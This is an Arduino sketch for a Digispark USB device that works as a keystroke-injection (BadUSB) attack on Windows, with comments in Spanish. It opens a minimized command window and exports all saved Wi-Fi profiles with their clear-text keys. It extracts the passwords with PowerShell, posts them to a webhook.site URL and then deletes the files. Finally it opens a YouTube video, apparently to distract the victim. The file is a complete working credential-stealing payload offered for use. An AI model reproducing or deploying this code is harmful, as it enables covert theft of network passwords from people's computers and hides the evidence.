#include <DigiKeyboard.h>

#define KEY_DOWN 0x51 // Down Arrow Key

void setup()
{
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(3000);

    // Cmd en segundo plano
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // (WIN + R)
    DigiKeyboard.delay(100);
    DigiKeyboard.println("cmd /c start /min cmd /c mode con: cols=15 lines=1"); // Minimizar ventana
    DigiKeyboard.delay(1000);

    DigiKeyboard.println("cd %temp%"); // Carpeta temporal
    DigiKeyboard.delay(500);
    DigiKeyboard.println("netsh wlan export profile key=clear > nul"); // Exporta perfiles Wi-Fi
    DigiKeyboard.delay(500);
    DigiKeyboard.println("powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); // Extrae contraseñas
    DigiKeyboard.delay(500);
    DigiKeyboard.println("powershell Invoke-WebRequest -Uri 	https://webhook.site/05ace2f7-f894-40f6-b8ff-237fa2aad3e5 -Method POST -InFile Wi-Fi-PASS > $null 2>&1"); // Envío
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("del Wi-Fi* /s /f /q"); // Elimina archivos
    DigiKeyboard.delay(500);
    DigiKeyboard.println("exit"); 
    DigiKeyboard.delay(100);

     // Abrir el navegador y cargar el video de YouTube
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // (WIN + R)
    DigiKeyboard.delay(100);
    DigiKeyboard.println("https://www.youtube.com/watch?v=8xQTxQbmYG8"); 
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); // Enter
    DigiKeyboard.delay(3000);
}

void loop() {
    
}
